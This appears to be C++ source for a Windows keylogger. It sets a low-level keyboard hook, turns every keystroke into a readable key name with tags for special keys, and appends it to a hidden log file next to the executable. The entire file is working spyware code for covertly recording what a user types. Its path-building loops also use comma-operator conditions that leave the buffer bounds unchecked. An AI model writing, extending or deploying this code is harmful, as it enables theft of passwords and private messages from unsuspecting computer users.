#include "header.h"

std::string myKey;
						
char keyNameBuff[16];
PKBDLLHOOKSTRUCT p;
unsigned int sc;

void writeToLog(std::string s) //write a string to the log
{
	std::ofstream log(logName, std::ios::app); //opens log file
	log << s; //writes to log.. with format '['']'
	log.close(); //closes log
}
BOOL isCaps()
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ||
		((GetKeyState(VK_SHIFT) & 0x8000) != 0)) {
		return 1;
	}
	else {
		return 0;
	}
}
LRESULT CALLBACK hookProc(int nCode,
	WPARAM wParam, LPARAM lParam)//proc to be run on hooked key
{
	if (wParam == WM_KEYDOWN)//if key event type is key down
	{
		//get the keyname from lParam
		p = (PKBDLLHOOKSTRUCT)(lParam);//used to get the vkCode
		sc = MapVirtualKey(p->vkCode, 0);
		sc <<= 16; //shift 16 bits

		if (!(p->vkCode <= 32))//if not ascii
		{
			sc |= 0x1 << 24; // <- extended bit
		}
		GetKeyNameTextA(sc, keyNameBuff, 16);

		//gets ASCII key name from sc into keyNameBuff

		//write keyname to log
		myKey = keyNameBuff;
		if (myKey == "Space") {
			writeToLog(" ");
		}
		else if (myKey == "Right Alt") {
			writeToLog("[R ALT]");
		}
		else if (myKey == "Enter") {
			writeToLog("[ENTER]");
		}
		else if (myKey == "Left Alt") {
			writeToLog("[L ALT]");
		}
		else if (myKey == "Tab") {
			writeToLog("[TAB]");
		}
		else if (myKey == "Backspace") {
			writeToLog("[BS]");
		}
		else if (myKey == "Caps Lock") {
			writeToLog("[CAPS]");
		}
		else if (myKey == "Delete") {
			writeToLog("[DEL]");
		}
		else if (myKey == "Right Shift") {
			writeToLog("[R SHIFT]");
		}
		else if (myKey == "Shift") {
			writeToLog("[L SHIFT]");
		}
		else if (myKey == "Ctrl") {
			writeToLog("[L CTRL]");
		}
		else if (myKey == "Right Ctrl") {
			writeToLog("[R CTRL]");
		}
		// if its none of the special keys
		else {
			if (isCaps() == 1) {
				writeToLog(myKey);
			}
			else {
				std::transform(myKey.begin(), myKey.end(),
					myKey.begin(), ::tolower);
				writeToLog(myKey);
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

char* GetCurPath(char* logName)
{
	LPTSTR temp = new TCHAR[MAX_PATH];
	GetModuleFileName(nullptr,temp, MAX_PATH);
	int i = 0, j = 0;
	for (i; i < MAX_PATH, temp[i] != '\0'; i++);
	for (i; i > 0, temp[i] != '\\'; i--);
	i++;
	for (i; i < MAX_PATH, logName[j] != '\0'; i++, j++) temp[i] = logName[j];
	temp[i] = '\0';
	for (i = 0; i < MAX_PATH, temp[i] != '\0'; i++) logName[i] = temp[i];
	return logName;
}
